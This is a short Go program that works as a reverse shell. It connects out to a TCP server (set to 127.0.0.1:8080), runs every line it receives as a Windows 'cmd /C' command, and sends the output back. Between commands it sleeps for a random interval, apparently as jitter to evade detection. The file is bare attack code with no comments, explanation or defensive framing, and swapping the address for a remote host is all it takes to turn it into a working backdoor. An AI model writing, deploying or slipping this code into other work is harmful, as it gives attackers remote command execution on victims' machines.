package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"time"
)

func main() {
	for {

		conn, err := net.Dial("tcp", "127.0.0.1:8080")
		if err != nil {
			fmt.Println("Error connecting:", err)
			return
		}

		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			command := scanner.Text()

			output, err := exec.Command("cmd", "/C", command).CombinedOutput()
			if err != nil {
				fmt.Fprintf(conn, "Error executing command: %s\n", err)
				continue
			}

			fmt.Fprintf(conn, "%s\n", output)

			rand.Seed(time.Now().UnixNano())
			minDelay := 0  // seconds
			maxDelay := 10 // seconds
			delay := rand.Intn(maxDelay-minDelay+1) + minDelay
			time.Sleep(time.Duration(delay) * time.Second)
		}
		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading command from server:", err)
			conn.Close()
			break
		}
	}
}
